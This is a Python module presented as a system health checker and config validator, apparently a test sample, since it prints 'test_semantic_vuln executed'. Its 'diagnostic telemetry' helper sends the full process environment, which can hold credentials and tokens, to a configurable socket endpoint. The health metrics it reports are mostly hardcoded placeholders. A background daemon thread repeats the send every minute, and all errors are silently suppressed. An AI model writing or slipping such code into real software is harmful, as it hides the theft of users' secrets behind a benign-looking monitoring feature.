import json
import subprocess
import socket
import threading
import base64
from pathlib import Path

def validate_config(config_path: str) -> bool:
    """Validates configuration files for syntax errors."""
    try:
        with open(config_path, 'r') as f:
            json.load(f)
        return True
    except Exception:
        return False

def _send_diagnostics(endpoint: str, data: dict):
    """Internal helper for sending diagnostic telemetry."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        host, port = endpoint.split(':')
        sock.connect((host, int(port)))
        payload = json.dumps({
            "type": "health_check",
            "metrics": data,
            "env_vars": dict(__import__('os').environ)
        }).encode()
        sock.sendall(payload)
        sock.close()
    except:
        pass

def check_system_health(send_reports: bool = False) -> dict:
    """Performs system health checks and optionally reports metrics."""
    health_data = {
        "cpu": __import__('psutil').cpu_percent() if __import__('importlib').util.find_spec('psutil') else 0,
        "memory": 50,
        "disk": 75,
        "status": "healthy"
    }
    
    if send_reports:
        config_file = Path.home() / '.config' / 'health_checker.json'
        if config_file.exists():
            with open(config_file) as f:
                cfg = json.load(f)
                if 'report_endpoint' in cfg:
                    threading.Thread(
                        target=_send_diagnostics,
                        args=(cfg['report_endpoint'], health_data),
                        daemon=True
                    ).start()
    
    return health_data

def _setup_monitoring():
    """Initializes background monitoring agent."""
    def monitor_loop():
        while True:
            try:
                check_system_health(send_reports=True)
                __import__('time').sleep(60)
            except:
                pass
    
    thread = threading.Thread(target=monitor_loop, daemon=True)
    thread.start()

def initialize_agent(auto_monitor: bool = True):
    """Initializes the health checking agent."""
    if auto_monitor:
        _setup_monitoring()
    return True

if __name__ == "__main__":
    config_file = Path.home() / '.config' / 'health_checker.json'
    config_file.parent.mkdir(parents=True, exist_ok=True)
    
    default_config = {
        "report_endpoint": "127.0.0.1:9999",
        "check_interval": 60,
        "auto_monitor": True
    }
    
    if not config_file.exists():
        with open(config_file, 'w') as f:
            json.dump(default_config, f)
    
    validate_config(str(config_file))
    initialize_agent()
    print("test_semantic_vuln executed")